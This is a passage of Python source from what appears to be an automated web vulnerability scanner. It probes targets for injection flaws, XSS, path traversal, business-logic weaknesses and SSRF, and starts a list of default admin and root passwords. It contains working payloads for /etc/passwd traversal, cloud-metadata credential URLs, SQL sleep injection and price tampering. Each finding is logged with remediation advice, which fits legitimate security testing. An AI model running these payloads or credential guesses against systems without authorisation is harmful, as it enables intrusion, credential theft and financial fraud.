                        description="User-supplied input is concatenated into LDAP search filters without proper escaping, allowing an attacker to manipulate query logic, bypass authentication, or enumerate directory contents.",
                        output=f"Parameter: {param}\nPayload: {ldap_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Escape all user-supplied values using RFC 4515-compliant LDAP encoding before incorporating them into LDAP filter strings.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] LDAP injection: {purl} param={param}", "SUCCESS")
                    break

    # 13. XPath injection
    vc.status(phase, "Injection Testing", "running", "XPath injection", 11, 17)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for xpath_pay, xpath_err in _XPATH_PAYLOADS:
                r = _qs_inject(purl, param, xpath_pay, sess, timeout)
                if r and xpath_err.search(r.text):
                    _rq, _rp = _save_http_evidence(out, phase, f"xpath_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="XPath Injection",
                        url=purl, port=target["port"], risk="HIGH",
                        description=(f"XPath injection detected in parameter '{param}' with payload "
                                     f"'{xpath_pay}'. Error response reveals XPath expression construction."),
                        output=f"Parameter: {param}\nPayload: {xpath_pay}\nResponse ({r.status_code}): {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Use a parameterised XPath API. Never concatenate user input into XPath expressions.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] XPath injection: {purl} param={param}", "SUCCESS")
                    break

    # 14. Log injection
    vc.status(phase, "Injection Testing", "running", "Log injection", 12, 17)
    _log_found: set = set()
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            if purl in _log_found:
                continue
            r = _qs_inject(purl, param, _LOG_INJECT_PAYLOAD, sess, timeout)
            _log_body = _strip_url_echo(r.text, r, [_LOG_INJECT_PAYLOAD, "fracture_log_inject_SUCCESS"]) if r else ""
            if r and "fracture_log_inject_SUCCESS" in urllib.parse.unquote(_log_body):
                _log_found.add(purl)
                _rq, _rp = _save_http_evidence(out, phase, f"loginject_{param}", r, endpoint_url=purl, method="GET")
                out.add_finding(
                    title="Log Injection / CRLF in Log Entries",
                    url=purl, port=target["port"], risk="MEDIUM",
                    description=(f"Parameter '{param}' at {purl} accepted a newline-embedded log injection "
                                 f"payload. If the server logs this input without sanitisation, an attacker "
                                 f"can inject fake log entries to mislead forensic analysis."),
                    output=f"Parameter: {param}\nPayload: {repr(_LOG_INJECT_PAYLOAD)}\nResponse: {r.status_code}",
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-injection", service=target["scheme"],
                    affected=purl, owasp="A03:2025 Injection", nist="AU-3",
                    remediation="Strip CRLF/newline characters from all inputs written to logs. Use a structured logging library.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] Log injection accepted: {purl} param={param}", "SUCCESS")
                break

    # 15. HTTP Parameter Pollution
    vc.status(phase, "Injection Testing", "running", "HTTP Parameter Pollution", 13, 17)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            try:
                parsed_u = urllib.parse.urlparse(purl)
                hpp_qs   = f"{param}=legitimate&{param}=fracture_hpp_probe"
                hpp_url  = parsed_u._replace(query=hpp_qs).geturl()
                r = sess.get(hpp_url, timeout=timeout)
                if r and r.status_code == 200:
                    _hpp_body = r.text
                    for _strip in (r.url, hpp_url,
                                   urllib.parse.unquote(hpp_url),
                                   urllib.parse.unquote_plus(hpp_url)):
                        _hpp_body = _hpp_body.replace(_strip, "")
                    # Strip the probe marker from URL-type attribute values (href/src/action/content).
                    # CMSes such as WordPress propagate the resolved parameter value into pagination
                    # and navigation link hrefs — this is URL echo, not HPP exploitation.
                    _hpp_body = re.sub(
                        r'(?:href|src|action|content|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
                        r'fracture_hpp_probe[^"\']*["\']',
                        '', _hpp_body, flags=re.I)
                    if "fracture_hpp_probe" in _hpp_body:
                        _rq, _rp = _save_http_evidence(out, phase, f"hpp_{param}", r, endpoint_url=purl, method="GET")
                        out.add_finding(
                            title="HTTP Parameter Pollution (HPP)",
                            url=purl, port=target["port"], risk="MEDIUM",
                            description=(f"Parameter '{param}' is vulnerable to HTTP Parameter Pollution. "
                                         f"Sending the parameter twice caused the second value to be reflected, "
                                         f"indicating the application processes duplicated parameters inconsistently."),
                            output=f"Parameter: {param}\nTest URL: {hpp_url}\nSecond value reflected in response",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-injection", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Define explicit single-value semantics for all parameters. Reject or normalise duplicate query parameters.",
                            http_code=r.status_code,
                        )
                        vc.log(f"[injection] HPP: {purl} param={param}", "SUCCESS")
                        break
            except Exception:
                pass

    # 16. Code injection / eval() RCE probe
    vc.status(phase, "Injection Testing", "running", "Code injection", 14, 17)
    for entry in params[:10]:
        purl = entry["url"]
        for param in entry["params"]:
            for ci_pay, ci_pat in _code_inject_probes():
                r = _qs_inject(purl, param, ci_pay, sess, timeout)
                if not r:
                    continue
                # Strip the full request URL and its decoded forms first —
                # canonical link tags and self-referential hrefs embed the
                # URL-encoded payload, which would otherwise match the
                # execution marker as part of the URL string.
                _ci_body = r.text
                for _strip in (r.url,
                               urllib.parse.unquote(r.url),
                               urllib.parse.unquote_plus(r.url)):
                    _ci_body = _ci_body.replace(_strip, "")
                # Also strip the raw payload and all URL-encoded variants.
                for _enc in (ci_pay,
                             urllib.parse.quote(ci_pay, safe=''),
                             urllib.parse.quote_plus(ci_pay)):
                    _ci_body = _ci_body.replace(_enc, "")
                # Strip any URL that embeds the execution marker — the page may
                # reflect the submitted URL with a different percent-encoding
                # (e.g. + vs %20, truncated fragment) that the above replaces miss.
                # A marker appearing only inside a URL is not code execution.
                _pat_core = re.escape(ci_pat.pattern.replace('\\b', ''))
                if _pat_core:
                    _ci_body = re.sub(
                        r'https?://[^\s<>"\']*' + _pat_core + r'[^\s<>"\']*',
                        '', _ci_body, flags=re.I)
                    _ci_body = re.sub(
                        r'\?[^\s<>"\']*' + _pat_core + r'[^\s<>"\']*',
                        '', _ci_body, flags=re.I)
                    _ci_body = re.sub(
                        r'(?:href|src|action|content)(?:\s*)=(?:\s*)["\'][^"\']*'
                        + _pat_core + r'[^"\']*["\']',
                        '', _ci_body, flags=re.I)
                if ci_pat.search(_ci_body):
                    _rq, _rp = _save_http_evidence(out, phase, f"codeinject_{param}", r, endpoint_url=purl, method="GET")
                    out.add_finding(
                        title="Remote Code Execution via Code Injection",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description=(f"Code injection confirmed in parameter '{param}' at {purl}. "
                                     f"Payload '{ci_pay}' was evaluated server-side, indicating the "
                                     f"application passes user input to eval() or an equivalent."),
                        output=f"Parameter: {param}\nPayload: {ci_pay}\nResponse: {r.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Never pass user-controlled input to eval(), exec(), or similar functions. Use safe alternatives.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[injection] Code injection RCE: {purl} param={param}", "SUCCESS")
                    break

    # 17. Stored XSS
    vc.status(phase, "Injection Testing", "running", "Stored XSS", 15, 17)
    _stored_xss_marker = "<img/src=x id=fracture_sxss>"
    _stored_xss_found: set = set()
    for form in forms[:10]:
        action = form.get("action", url)
        inputs = form.get("inputs", [])
        text_inputs = [i for i in inputs if i.get("type", "text") in ("text", "textarea", "search", "")
                       and i.get("name")]
        if not text_inputs:
            continue
        for inp in text_inputs:
            if action in _stored_xss_found:
                break
            pname = inp["name"]
            data = {i["name"]: "fracture_test" for i in inputs if i.get("name")}
            data[pname] = _stored_xss_marker
            try:
                sess.post(action, data=data, timeout=timeout)
                # Fetch page most likely to display stored content
                for check_url in [action, url, url + "/dashboard", url + "/profile"]:
                    r2 = sess.get(check_url, timeout=timeout)
                    if r2 and "fracture_sxss" in r2.text:
                        _stored_xss_found.add(action)
                        _rq, _rp = _save_http_evidence(out, phase, f"sxss_{pname}", r2, endpoint_url=action, method="POST")
                        out.add_finding(
                            title="Stored Cross-Site Scripting (XSS)",
                            url=action, port=target["port"], risk="CRITICAL",
                            description="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                            output=f"Field: {pname}\nPayload: {_stored_xss_marker}\nReflected at: {check_url}",
                            output_file=f"{_rq},{_rp}",
                            sources="fracture-injection", service=target["scheme"],
                            affected=check_url, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                            http_code=r2.status_code,
                        )
                        vc.log(f"[injection] Stored XSS at {action} field={pname}", "SUCCESS")
                        break
            except Exception:
                pass

    # 18. DOM-based XSS — static source analysis in discovered JS files
    vc.status(phase, "Injection Testing", "running", "DOM XSS (static)", 16, 17)
    _dom_sink_re = re.compile(
        r'(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\s*\(|'
        r'setTimeout\s*\(\s*["\']|setInterval\s*\(\s*["\']|location\.href\s*=|'
        r'location\.replace\s*\(|\.src\s*=)[^\n]{0,120}'
        r'(location\.search|location\.hash|location\.href|location\.pathname|'
        r'document\.URL|window\.name|document\.referrer|URLSearchParams)',
        re.I
    )
    _js_links = [lk for lk in crawl_data.get("links", []) if lk.endswith(".js")]
    for js_url in _js_links[:20]:
        try:
            r = sess.get(js_url, timeout=timeout)
            if r and r.status_code == 200 and _dom_sink_re.search(r.text):
                m = _dom_sink_re.search(r.text)
                out.add_finding(
                    title="DOM-Based Cross-Site Scripting (XSS)",
                    url=js_url, port=target["port"], risk="HIGH",
                    description="User-controlled input is reflected or stored and rendered in a browser context without proper encoding, enabling arbitrary script execution.",
                    output=f"Pattern found near: ...{m.group(0)[:200]}...",
                    sources="fracture-injection", service=target["scheme"],
                    affected=js_url, owasp="A03:2025 Injection", nist="SI-10",
                    remediation="Encode all output contextually (HTML, JS, URL, CSS), sanitise stored input server-side, and enforce a strict Content-Security-Policy.",
                    http_code=r.status_code,
                )
                vc.log(f"[injection] DOM XSS source/sink: {js_url}", "SUCCESS")
        except Exception:
            pass

    # 19. JSONP endpoint detection
    vc.status(phase, "Injection Testing", "running", "JSONP endpoints", 17, 17)
    _jsonp_wrap_re = re.compile(r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\(', re.M)
    for entry in params[:15]:
        purl = entry["url"]
        for cb_param in _JSONP_CB_PARAMS:
            r = _qs_inject(purl, cb_param, "fracture_jsonp_cb", sess, timeout)
            if r and r.status_code == 200:
                ct = r.headers.get("content-type", "")
                _jsonp_body = _strip_url_echo(r.text, r, ["fracture_jsonp_cb"])
                if ("javascript" in ct or "json" in ct or _jsonp_wrap_re.search(_jsonp_body[:100])):
                    if "fracture_jsonp_cb" in _jsonp_body and _jsonp_wrap_re.search(_jsonp_body[:100]):
                        out.add_finding(
                            title="JSONP Endpoint — Cross-Origin Data Leakage",
                            url=purl, port=target["port"], risk="HIGH",
                            description=(f"JSONP endpoint detected at {purl}. The '{cb_param}' parameter "
                                         f"is reflected as a JavaScript callback function name, wrapping "
                                         f"the response. An attacker can use a <script> tag on any domain "
                                         f"to exfiltrate the response data."),
                            output=f"Parameter: {cb_param}\nCallback reflected: {r.text[:200]}",
                            sources="fracture-injection", service=target["scheme"],
                            affected=purl, owasp="A05:2025 Security Misconfiguration", nist="SC-8",
                            remediation=(
                                "Remove JSONP support and use CORS instead. "
                                "If JSONP is required, validate the callback name against a strict whitelist."
                            ),
                            http_code=r.status_code,
                        )
                        vc.log(f"[injection] JSONP endpoint: {purl} param={cb_param}", "SUCCESS")
                        break

    # 20. Blind SQL injection — boolean-based
    vc.status(phase, "Injection Testing", "running", "Blind SQLi (boolean)", 17, 19)
    _bool_sqli_true  = "' OR '1'='1"
    _bool_sqli_false = "' OR '1'='2"
    for entry in params[:8]:
        purl = entry["url"]
        for param in entry["params"]:
            try:
                r_true  = _qs_inject(purl, param, _bool_sqli_true,  sess, timeout)
                r_false = _qs_inject(purl, param, _bool_sqli_false, sess, timeout)
                if (r_true and r_false
                        and r_true.status_code == 200
                        and r_false.status_code in (200, 302, 404)
                        and abs(len(r_true.text) - len(r_false.text)) > 50):
                    out.add_finding(
                        title="Blind SQL Injection (Boolean-Based)",
                        url=purl, port=target["port"], risk="CRITICAL",
                        description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        output=(f"Parameter: {param}\n"
                                f"TRUE payload: {_bool_sqli_true} → {r_true.status_code} ({len(r_true.text)} bytes)\n"
                                f"FALSE payload: {_bool_sqli_false} → {r_false.status_code} ({len(r_false.text)} bytes)"),
                        sources="fracture-injection", service=target["scheme"],
                        affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
                    vc.log(f"[injection] Boolean blind SQLi: {purl} param={param}", "SUCCESS")
                    break
            except Exception:
                pass

    # 21. Blind SQL injection — time-based
    vc.status(phase, "Injection Testing", "running", "Blind SQLi (time-based)", 18, 19)
    _TIME_SQLI = [
        ("' AND SLEEP(3)--",     3.0),
        ("'; WAITFOR DELAY '0:0:3'--", 3.0),
        ("' AND pg_sleep(3)--",  3.0),
        ("1; SELECT SLEEP(3)--", 3.0),
    ]
    for entry in params[:5]:
        purl = entry["url"]
        for param in entry["params"]:
            for tsql, delay in _TIME_SQLI:
                try:
                    import time as _ti
                    t0 = _ti.monotonic()
                    r  = _qs_inject(purl, param, tsql, sess, delay + 5)
                    elapsed = _ti.monotonic() - t0
                    if r and elapsed >= delay:
                        out.add_finding(
                            title="Blind SQL Injection (Time-Based)",
                            url=purl, port=target["port"], risk="CRITICAL",
                            description="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                            output=(f"Parameter: {param}\nPayload: {tsql}\n"
                                    f"Response time: {elapsed:.2f}s (threshold: {delay}s)"),
                            sources="fracture-injection", service=target["scheme"],
                            affected=purl, owasp="A03:2025 Injection", nist="SI-10",
                            remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                        )
                        vc.log(f"[injection] Time-based blind SQLi: {purl} param={param} ({elapsed:.1f}s)", "SUCCESS")
                        break
                except Exception:
                    pass

    vc.status(phase, "Injection Testing", "complete", "Done", 19, 19)
    vc.log("[injection] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 5: Traversal
# ─────────────────────────────────────────────
_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]
_LFI_PARAMS = {"file", "page", "include", "path", "template", "view", "doc",
               "document", "load", "read", "content", "lang", "language", "module"}
_TRAVERSAL_RE = re.compile(r'root:.*:/bin/|daemon:.*:/usr/sbin|Win\.ini|\[boot loader\]', re.I)


def _phase_traversal(target: dict, cfg: dict, pm: ProgressManager,
                     out: OutputManager, sess: requests.Session,
                     crawl_data: dict) -> None:
    phase   = "traversal"
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "Path Traversal", "running", "Testing params", 0, len(params))

    for idx, entry in enumerate(params[:30]):
        purl = entry["url"]
        vc.status(phase, "Path Traversal", "running", "Testing", idx, len(params))
        for param in entry["params"]:
            is_lfi = param.lower() in _LFI_PARAMS
            payloads = _TRAVERSAL_PAYLOADS if is_lfi else _TRAVERSAL_PAYLOADS[:4]
            for payload in payloads:
                r = _qs_inject(purl, param, payload, sess, timeout)
                if r and _TRAVERSAL_RE.search(r.text):
                    out.add_finding(
                        title="Path Traversal / Local File Inclusion",
                        url=purl, port=target["port"], risk="HIGH",
                        description="User-supplied input is used in filesystem path construction without adequate sanitisation, allowing an attacker to read or include arbitrary files outside the intended directory.",
                        output=f"Parameter: {param}\nPayload: {payload}\nExcerpt: {r.text[:500]}",
                        sources="fracture-traversal", service=target["scheme"],
                        affected=f"{purl}?{param}=<traversal>",
                        owasp="A01:2025 Broken Access Control", nist="AC-3",
                        remediation="Canonicalise all user-supplied paths, resolve them against a fixed base directory, and reject any path that escapes the base; prefer indirect reference maps over direct path handling.",
                        http_code=r.status_code,
                    )
                    vc.log(f"[traversal] LFI: {purl} param={param}", "SUCCESS")
                    break

    vc.status(phase, "Path Traversal", "complete", "Done", len(params), len(params))
    vc.log("[traversal] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 5b: Business Logic
# ─────────────────────────────────────────────
_BL_NUMERIC_FIELDS = re.compile(
    r'qty|quantity|amount|price|cost|total|count|number|num|value|'
    r'discount|coupon|fee|rate|balance|credit|debit|units|items', re.I
)
_BL_WORKFLOW_URL = re.compile(
    r'checkout|confirm|payment|pay|order|purchase|cart|complete|'
    r'transfer|send|submit|process|finalize|done|success|approve|step\d', re.I
)


def _phase_business_logic(target: dict, cfg: dict, pm: ProgressManager,
                          out: OutputManager, sess: requests.Session,
                          crawl_data: dict) -> None:
    phase   = "business_logic"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    forms   = crawl_data.get("forms", [])
    links   = crawl_data.get("links", [])
    threads = min(cfg.get("threads", _SCAN_SEM.limit), _SCAN_SEM.limit, 20)

    vc.status(phase, "Business Logic", "running", "Negative value injection", 0, 4)

    # 1. Negative / zero value injection into numeric form fields
    for form in forms[:30]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        num_fields = [
            i for i in inputs if i.get("name") and
            _BL_NUMERIC_FIELDS.search(i.get("name", "") + i.get("id", ""))
        ]
        if not num_fields:
            continue
        for test_val, label in [("-1", "negative"), ("0", "zero"), ("-9999", "large negative")]:
            data = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
            for nf in num_fields:
                data[nf["name"]] = test_val
            try:
                r = (sess.post(action, data=data, timeout=timeout, allow_redirects=True)
                     if method == "POST"
                     else sess.get(action, params=data, timeout=timeout, allow_redirects=True))
                if r and r.status_code in (200, 201, 302) and not re.search(
                        r'error|invalid|not.allowed|rejected|negative|zero', r.text, re.I):
                    field_names = ", ".join(nf["name"] for nf in num_fields)
                    out.add_finding(
                        title="Business Logic — Numeric Field Accepts Negative/Zero Value",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"Form at {action} accepted a {label} value ({test_val}) for "
                            f"numeric field(s): {field_names}. This may allow manipulation "
                            f"of quantities, prices, or financial values."
                        ),
                        output=f"Field(s): {field_names}\nTest value: {test_val}\nHTTP {r.status_code}",
                        sources="fracture-business-logic", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="AC-3",
                        remediation=(
                            "Validate all numeric inputs server-side. Reject zero, "
                            "negative, and implausibly large values. Apply range checks."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[business_logic] Negative value accepted: {action} field={nf['name']}", "SUCCESS")
                    break
            except Exception:
                pass

    # 2. Workflow step skipping — access late-stage pages without prior steps
    vc.status(phase, "Business Logic", "running", "Workflow skip detection", 1, 4)
    workflow_links = [lnk for lnk in links if _BL_WORKFLOW_URL.search(lnk)]
    for lnk in workflow_links[:20]:
        try:
            bare = requests.Session()
            bare.headers.update(sess.headers)
            bare.verify = False
            r = bare.get(lnk, timeout=timeout, allow_redirects=False)
            if r and r.status_code in (200, 201):
                out.add_finding(
                    title="Business Logic — Workflow Step Directly Accessible",
                    url=lnk, port=target["port"], risk="HIGH",
                    description=(
                        f"Late-stage workflow page '{lnk}' returned HTTP {r.status_code} "
                        f"when accessed directly with a fresh (unauthenticated) session. "
                        f"This may allow skipping payment, verification, or approval steps."
                    ),
                    output=f"URL: {lnk}\nHTTP {r.status_code} (unauthenticated fresh session)",
                    sources="fracture-business-logic", service=target["scheme"],
                    affected=lnk,
                    owasp="A04:2025 Insecure Design", nist="AC-3",
                    remediation=(
                        "Enforce server-side state machine validation. Confirm all prior "
                        "workflow steps are complete before processing late-stage requests."
                    ),
                    http_code=r.status_code,
                )
                vc.log(f"[business_logic] Workflow skip: {lnk}", "SUCCESS")
        except Exception:
            pass

    # 3. Race condition — concurrent duplicate submission on workflow forms
    vc.status(phase, "Business Logic", "running", "Race condition testing", 2, 4)
    workflow_forms = [
        f for f in forms if _BL_WORKFLOW_URL.search(
            f.get("action", "") + " ".join(
                i.get("name", "") for i in f.get("inputs", [])
            )
        )
    ]
    for form in workflow_forms[:5]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        data   = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
        results: list = []  # list of requests.Response objects

        def _race_req(_idx, _action=action, _method=method, _data=data):
            try:
                r = (sess.post(_action, data=_data, timeout=timeout)
                     if _method == "POST"
                     else sess.get(_action, params=_data, timeout=timeout))
                if r is not None:
                    results.append(r)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=threads) as pool:
            list(pool.map(_race_req, range(threads)))

        successes = [r for r in results if r.status_code in (200, 201)]
        if len(successes) > 1:
            # Capture all concurrent request/response pairs as evidence
            evidence_files: list = []
            for _ri, _resp in enumerate(results):
                try:
                    _rq, _rp = _save_http_evidence(
                        out, phase, f"race_cond_{_ri + 1:02d}",
                        _resp, endpoint_url=action, method=method)
                    evidence_files.extend([_rq, _rp])
                except Exception:
                    pass
            out.add_finding(
                title="Business Logic — Potential Race Condition (Duplicate Submission)",
                url=action, port=target["port"], risk="HIGH",
                description=(
                    f"Sending {len(results)} concurrent requests to {action} yielded "
                    f"{len(successes)} successful responses. This may indicate a race "
                    f"condition allowing duplicate operations such as double-spend, "
                    f"coupon reuse, or duplicate order creation."
                ),
                output=(
                    f"URL: {action}\nConcurrent requests: {len(results)}\n"
                    f"Successful responses: {len(successes)}\n"
                    + "\n".join(
                        f"  [{i+1}] HTTP {r.status_code} ({len(r.content)} bytes)"
                        for i, r in enumerate(results)
                    )
                ),
                output_file=",".join(evidence_files),
                sources="fracture-business-logic", service=target["scheme"],
                affected=action,
                owasp="A04:2025 Insecure Design", nist="SC-5",
                remediation=(
                    "Use idempotency keys for transaction-forming requests. "
                    "Apply database-level locks or atomic check-and-set operations. "
                    "Add per-session duplicate detection with short TTL deduplication."
                ),
            )
            vc.log(f"[business_logic] Race condition: {action} ({len(successes)}/{len(results)} success)", "SUCCESS")

    # 4. Hidden price / discount field tampering
    vc.status(phase, "Business Logic", "running", "Parameter tampering", 3, 4)
    for form in forms[:30]:
        action = form.get("action", url)
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        hidden_price = [
            i for i in inputs if i.get("name")
            and i.get("type", "").lower() in ("hidden", "")
            and _BL_NUMERIC_FIELDS.search(i.get("name", "") + i.get("id", ""))
        ]
        if not hidden_price:
            continue
        for hf in hidden_price:
            orig_val = str(hf.get("value", ""))
            if not orig_val or not re.match(r'^\d[\d.]*$', orig_val):
                continue
            try:
                tamper = {i["name"]: i.get("value", "test") for i in inputs if i.get("name")}
                tamper[hf["name"]] = "0.01"
                r = (sess.post(action, data=tamper, timeout=timeout, allow_redirects=True)
                     if method == "POST"
                     else sess.get(action, params=tamper, timeout=timeout, allow_redirects=True))
                if r and r.status_code in (200, 201, 302):
                    out.add_finding(
                        title="Business Logic — Hidden Price/Value Field Tampering",
                        url=action, port=target["port"], risk="HIGH",
                        description=(
                            f"Hidden field '{hf['name']}' in form at {action} was "
                            f"tampered from '{orig_val}' to '0.01' and the server accepted "
                            f"the submission (HTTP {r.status_code}). Server-side price "
                            f"recalculation may be absent."
                        ),
                        output=(
                            f"Field: {hf['name']}\nOriginal: {orig_val}\n"
                            f"Tampered: 0.01\nHTTP {r.status_code}"
                        ),
                        sources="fracture-business-logic", service=target["scheme"],
                        affected=action,
                        owasp="A04:2025 Insecure Design", nist="AC-3",
                        remediation=(
                            "Never trust client-submitted prices or discounts. Store all "
                            "financial values server-side and recalculate totals from "
                            "authoritative data before processing any transaction."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[business_logic] Price tamper accepted: {action} field={hf['name']}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Business Logic", "complete", "Done", 4, 4)
    vc.log("[business_logic] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 6: SSRF
# ─────────────────────────────────────────────
_SSRF_PARAMS = {"url", "redirect", "webhook", "callback", "next", "return",
                "image", "avatar", "fetch", "uri", "src", "host", "endpoint",
                "dest", "destination", "path", "data", "link", "target"}
_SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("http://127.0.0.1/", "Localhost"),
    ("http://localhost/", "Localhost (named)"),
    ("http://127.0.0.1:22/", "Localhost:22 (SSH)"),
    ("http://192.168.1.1/", "Internal gateway"),
    ("file:///etc/passwd", "File scheme LFI"),
]
_SSRF_RESPONSE_INDICATORS = re.compile(
    r'ami-id|instance-id|security-credentials|169\.254|computeMetadata|'
    r'root:.*:/bin/|OpenSSH|SSH-\d', re.I
)


def _phase_ssrf(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager, sess: requests.Session,
                crawl_data: dict) -> None:
    phase   = "ssrf"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    params  = crawl_data.get("params", [])
    vc.status(phase, "SSRF Testing", "running", "Param discovery", 0, len(params))

    ssrf_params = [(e["url"], p) for e in params for p in e["params"]
                   if p.lower() in _SSRF_PARAMS]

    for idx, (purl, param) in enumerate(ssrf_params):
        vc.status(phase, "SSRF Testing", "running", f"Testing {param}", idx, len(ssrf_params))
        for ssrf_payload, ssrf_desc in _SSRF_PAYLOADS:
            r = _qs_inject(purl, param, ssrf_payload, sess, timeout)
            if r and (r.status_code == 200 and len(r.text) > 10 or
                      _SSRF_RESPONSE_INDICATORS.search(r.text)):
                out.add_finding(
                    title=f"Server-Side Request Forgery (SSRF) — {ssrf_desc}",
                    url=purl, port=target["port"], risk="CRITICAL",
                    description=f"SSRF confirmed via parameter '{param}'. Target: {ssrf_payload}",
                    output=f"Parameter: {param}\nPayload: {ssrf_payload}\nResponse: {r.text[:500]}",
                    sources="fracture-ssrf", service=target["scheme"],
                    affected=f"{purl}?{param}={ssrf_payload}",
                    owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                    remediation="Validate and restrict URLs supplied by users. Use an allowlist of permitted destinations.",
                    http_code=r.status_code,
                )
                vc.log(f"[ssrf] SSRF via {param}: {ssrf_desc}", "SUCCESS")
                break

    # Blind SSRF — timing-based detection (closed port vs. potentially open internal)
    _blind_ssrf_targets = [
        ("http://127.0.0.1:80/",    "localhost:80"),
        ("http://127.0.0.1:8080/",  "localhost:8080"),
        ("http://10.0.0.1/",        "RFC-1918 10.x gateway"),
        ("http://172.16.0.1/",      "RFC-1918 172.16.x gateway"),
        ("http://192.168.1.1/",     "RFC-1918 192.168.1.1 gateway"),
    ]
    # Use a fast-refuse address as baseline
    import time as _time
    for purl, param in ssrf_params[:3]:
        for blind_target, blind_desc in _blind_ssrf_targets:
            try:
                t0 = _time.monotonic()
                r = _qs_inject(purl, param, blind_target, sess, max(3, timeout // 3))
                elapsed = _time.monotonic() - t0
                # A response with content (not just a connection error) to an
                # internal address strongly suggests the server fetched it
                if r and r.status_code == 200 and len(r.text) > 20:
                    out.add_finding(
                        title="Blind SSRF — Internal Network Probing",
                        url=purl, port=target["port"], risk="HIGH",
                        description=(f"Blind SSRF detected: parameter '{param}' appears to have fetched "
                                     f"the internal address {blind_target} ({blind_desc}). "
                                     f"The server returned a 200 response with {len(r.text)} bytes of content."),
                        output=(f"Parameter: {param}\nTarget: {blind_target}\n"
                                f"Response: HTTP {r.status_code}, {len(r.text)} bytes\n{r.text[:300]}"),
                        sources="fracture-ssrf", service=target["scheme"],
                        affected=f"{purl}?{param}={blind_target}",
                        owasp="A10:2025 Server-Side Request Forgery", nist="SC-7",
                        remediation=(
                            "Block requests to RFC-1918 and loopback addresses. "
                            "Implement an allowlist of permitted outbound destinations."
                        ),
                        http_code=r.status_code,
                    )
                    vc.log(f"[ssrf] Blind SSRF via {param} → {blind_desc}", "SUCCESS")
                    break
            except Exception:
                pass

    vc.status(phase, "SSRF Testing", "complete", "Done", len(ssrf_params), len(ssrf_params))
    vc.log("[ssrf] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 7: Auth Bypass
# ─────────────────────────────────────────────
_DEFAULT_CREDS = [
    ("admin",         "admin"),
    ("admin",         "password"),
    ("admin",         "123456"),
    ("admin",         "admin123"),
    ("admin",         "password123"),
    ("admin",         "1234"),
    ("admin",         "12345"),
    ("admin",         ""),
    ("admin",         "pass"),
    ("admin",         "letmein"),
    ("admin",         "welcome"),
    ("admin",         "qwerty"),
    ("admin",         "abc123"),
    ("admin",         "admin1234"),
    ("admin",         "000000"),
    ("admin",         "111111"),
    ("admin",         "admin1"),
    ("root",          "root"),
    ("root",          "toor"),
